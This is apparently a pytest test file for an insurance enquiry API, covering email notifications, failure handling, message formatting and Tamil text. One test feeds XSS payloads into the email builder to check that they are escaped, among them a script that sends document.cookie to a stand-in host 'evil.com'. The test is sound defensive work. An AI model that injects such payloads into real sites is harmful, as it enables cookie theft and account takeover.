import html
import smtplib
from unittest.mock import MagicMock, patch
import pytest
from httpx import AsyncClient
from sqlalchemy import select
from sqlalchemy.exc import SQLAlchemyError

from app.core.config import settings
from app.db.session import get_db
from app.models.enquiry import Enquiry
from app.services.email import (
    build_enquiry_notification_message,
    send_email_sync,
    send_enquiry_notification,
)


@pytest.mark.asyncio
async def test_successful_enquiry_creation_triggers_email(async_client: AsyncClient):
    payload = {
        "full_name": "Ravi Kumar",
        "mobile_number": "9876543210",
        "whatsapp_number": "9876543210",
        "vehicle_type": "two-wheeler",
        "vehicle_registration_number": "TN 49 AB 1234",
        "requirement": "new-insurance",
        "message": "Need insurance quote for my new bike."
    }

    with patch("app.api.endpoints.enquiries.send_enquiry_notification") as mock_send:
        response = await async_client.post(f"{settings.API_V1_STR}/enquiries", json=payload)
        assert response.status_code == 201
        data = response.json()
        assert data["full_name"] == payload["full_name"]
        assert data["status"] == "NEW"

        # Verify exactly one email notification attempt was dispatched
        assert mock_send.call_count == 1
        called_args = mock_send.call_args[0][0]
        assert called_args["full_name"] == "Ravi Kumar"
        assert called_args["mobile_number"] == "9876543210"
        assert called_args["whatsapp_number"] == "9876543210"
        assert called_args["vehicle_type"] == "two-wheeler"
        assert called_args["vehicle_registration_number"] == "TN 49 AB 1234"
        assert called_args["requirement"] == "new-insurance"
        assert called_args["message"] == "Need insurance quote for my new bike."
        assert called_args["id"] == data["id"]


@pytest.mark.asyncio
async def test_invalid_input_does_not_trigger_email(async_client: AsyncClient):
    invalid_payload = {
        "full_name": "Ravi Kumar",
        "mobile_number": "123",  # Invalid phone
        "vehicle_type": "two-wheeler",
        "requirement": "new-insurance"
    }

    with patch("app.api.endpoints.enquiries.send_enquiry_notification") as mock_send:
        response = await async_client.post(f"{settings.API_V1_STR}/enquiries", json=invalid_payload)
        assert response.status_code == 422
        # No email should be attempted when input validation fails
        mock_send.assert_not_called()


@pytest.mark.asyncio
async def test_database_failure_does_not_trigger_email(async_client: AsyncClient):
    payload = {
        "full_name": "Ravi Kumar",
        "mobile_number": "9876543210",
        "vehicle_type": "two-wheeler",
        "requirement": "new-insurance"
    }

    with patch("sqlalchemy.ext.asyncio.AsyncSession.commit", side_effect=SQLAlchemyError("DB down")), \
         patch("app.api.endpoints.enquiries.send_enquiry_notification") as mock_send:
        response = await async_client.post(f"{settings.API_V1_STR}/enquiries", json=payload)
        assert response.status_code == 500
        # No email should be attempted if database transaction fails
        mock_send.assert_not_called()


@pytest.mark.asyncio
async def test_smtp_failure_does_not_undo_saved_enquiry(async_client: AsyncClient):
    payload = {
        "full_name": "Priya Sharma",
        "mobile_number": "9876543211",
        "vehicle_type": "private-car",
        "requirement": "renewal"
    }

    # Simulate SMTP failure in send_email_sync
    with patch("smtplib.SMTP", side_effect=smtplib.SMTPConnectError(421, b"Connection refused")), \
         patch.object(settings, "SMTP_EMAIL", "test@gmail.com"), \
         patch.object(settings, "SMTP_APP_PASSWORD", "mock-app-pass"):

        response = await async_client.post(f"{settings.API_V1_STR}/enquiries", json=payload)
        # The API request must succeed even if SMTP is unavailable
        assert response.status_code == 201
        data = response.json()
        enquiry_id = data["id"]
        assert data["full_name"] == "Priya Sharma"

        # Verify the enquiry remains saved in the database
        override_db = async_client._transport.app.dependency_overrides[get_db]
        async for session in override_db():
            result = await session.execute(select(Enquiry).where(Enquiry.id == enquiry_id))
            saved = result.scalar_one_or_none()
            assert saved is not None
            assert saved.full_name == "Priya Sharma"
            assert saved.status == "NEW"


@pytest.mark.asyncio
async def test_status_update_does_not_trigger_email(async_client: AsyncClient, admin_token: str):
    # 1. Create enquiry
    payload = {
        "full_name": "Karthik Raja",
        "mobile_number": "9876543212",
        "vehicle_type": "commercial",
        "requirement": "claim"
    }
    with patch("app.api.endpoints.enquiries.send_enquiry_notification") as mock_send:
        res = await async_client.post(f"{settings.API_V1_STR}/enquiries", json=payload)
        assert res.status_code == 201
        enquiry_id = res.json()["id"]
        assert mock_send.call_count == 1

    # 2. Update status as admin
    with patch("app.api.endpoints.enquiries.send_enquiry_notification") as mock_send_update:
        headers = {"Authorization": f"Bearer {admin_token}"}
        update_res = await async_client.patch(
            f"{settings.API_V1_STR}/enquiries/{enquiry_id}",
            json={"status": "CONTACTED"},
            headers=headers
        )
        assert update_res.status_code == 200
        assert update_res.json()["status"] == "CONTACTED"
        # Status changes must not send customer enquiry creation emails
        mock_send_update.assert_not_called()


def test_email_message_formatting_and_optional_fields():
    # Case A: All fields provided
    full_data = {
        "id": "test-uuid-1234",
        "full_name": "Anitha G",
        "mobile_number": "9876543213",
        "whatsapp_number": "9876543214",
        "vehicle_type": "two-wheeler",
        "vehicle_registration_number": "TN 49 C 5678",
        "requirement": "new-insurance",
        "message": "Looking for comprehensive insurance.",
        "created_at": "2026-10-13T10:00:00Z"
    }
    msg = build_enquiry_notification_message(full_data)
    assert msg["Subject"] == "New Vehicle Insurance Enquiry - Dheeksha Insurance"
    assert msg["To"] == settings.ENQUIRY_NOTIFICATION_EMAIL

    # Check payload parts
    payload_text = msg.get_body(preferencelist=("plain",)).get_content()
    assert "Customer Name:              Anitha G" in payload_text
    assert "Mobile Number:              9876543213" in payload_text
    assert "WhatsApp Number:            9876543214" in payload_text
    assert "Vehicle Type:               Two-Wheeler" in payload_text
    assert "Vehicle Registration No:    TN 49 C 5678" in payload_text
    assert "Requirement:                New Insurance" in payload_text
    assert "Message:                    Looking for comprehensive insurance." in payload_text

    # Case B: Optional fields omitted
    minimal_data = {
        "id": "test-uuid-5678",
        "full_name": "Suresh M",
        "mobile_number": "9876543215",
        "whatsapp_number": None,
        "vehicle_type": "heavy",
        "vehicle_registration_number": None,
        "requirement": "renewal",
        "message": None,
        "created_at": None
    }
    min_msg = build_enquiry_notification_message(minimal_data)
    min_text = min_msg.get_body(preferencelist=("plain",)).get_content()
    assert "Customer Name:              Suresh M" in min_text
    assert "WhatsApp Number:            Not provided" in min_text
    assert "Vehicle Registration No:    Not provided" in min_text
    assert "Message:                    Not provided" in min_text


def test_html_escaping_prevents_xss():
    malicious_data = {
        "id": "xss-test",
        "full_name": "<script>alert('pwned')</script>",
        "mobile_number": "9876543210",
        "whatsapp_number": "<b onmouseover='alert(1)'>9876543210</b>",
        "vehicle_type": "other",
        "vehicle_registration_number": "<img src=x onerror=alert(2)>",
        "requirement": "other",
        "message": "<script>fetch('http://evil.com?c=' + document.cookie)</script>",
        "created_at": None
    }
    msg = build_enquiry_notification_message(malicious_data)
    html_content = msg.get_body(preferencelist=("html",)).get_content()

    # Raw script tags must not be present in the HTML output
    assert "<script>" not in html_content
    assert "<img src=x" not in html_content
    assert "<b onmouseover=" not in html_content

    # Escaped versions must be present
    assert html.escape("<script>alert('pwned')</script>") in html_content
    assert html.escape("<img src=x onerror=alert(2)>") in html_content


def test_send_email_sync_smtp_flow():
    mock_server = MagicMock()
    with patch("smtplib.SMTP", return_value=mock_server) as mock_smtp, \
         patch.object(settings, "SMTP_EMAIL", "sender@gmail.com"), \
         patch.object(settings, "SMTP_APP_PASSWORD", "secret-app-pass"):

        mock_server.__enter__.return_value = mock_server

        test_data = {
            "id": "1",
            "full_name": "John Doe",
            "mobile_number": "9876543210",
            "vehicle_type": "private-car",
            "requirement": "policy"
        }
        success = send_enquiry_notification(test_data)
        assert success is True

        mock_smtp.assert_called_once_with(settings.SMTP_HOST, settings.SMTP_PORT, timeout=settings.SMTP_TIMEOUT)
        mock_server.ehlo.assert_called()
        mock_server.starttls.assert_called_once()
        mock_server.login.assert_called_once_with("sender@gmail.com", "secret-app-pass")
        mock_server.send_message.assert_called_once()


def test_send_email_sync_skips_when_credentials_missing():
    with patch.object(settings, "SMTP_EMAIL", ""), \
         patch.object(settings, "SMTP_APP_PASSWORD", ""):
        test_data = {
            "id": "1",
            "full_name": "John Doe",
            "mobile_number": "9876543210",
            "vehicle_type": "private-car",
            "requirement": "policy"
        }
        with patch("smtplib.SMTP") as mock_smtp:
            success = send_enquiry_notification(test_data)
            assert success is False
            mock_smtp.assert_not_called()


def test_email_message_tamil_unicode_support():
    """
    Verify that customer enquiries containing Tamil Unicode text
    are properly formatted into both plain-text and HTML email parts
    without character corruption or mojibake.
    """
    tamil_data = {
        "id": "tamil-uuid-9999",
        "full_name": "பாரதிநேசன்",
        "mobile_number": "9876543210",
        "whatsapp_number": "9876543210",
        "vehicle_type": "two-wheeler",
        "vehicle_registration_number": "TN 49 AB 1234",
        "requirement": "new-insurance",
        "message": "எனது புதிய இருசக்கர வாகனத்திற்கு விரிவான காப்பீடு தேவை.",
        "created_at": "2026-10-15T10:00:00Z"
    }
    msg = build_enquiry_notification_message(tamil_data)
    assert msg["Subject"] == "New Vehicle Insurance Enquiry - Dheeksha Insurance"

    # Plain text verification
    plain_content = msg.get_body(preferencelist=("plain",)).get_content()
    assert "Customer Name:              பாரதிநேசன்" in plain_content
    assert "Message:                    எனது புதிய இருசக்கர வாகனத்திற்கு விரிவான காப்பீடு தேவை." in plain_content

    # HTML verification
    html_content = msg.get_body(preferencelist=("html",)).get_content()
    assert "<meta charset=\"utf-8\">" in html_content
    assert "பாரதிநேசன்" in html_content
    assert "எனது புதிய இருசக்கர வாகனத்திற்கு விரிவான காப்பீடு தேவை." in html_content

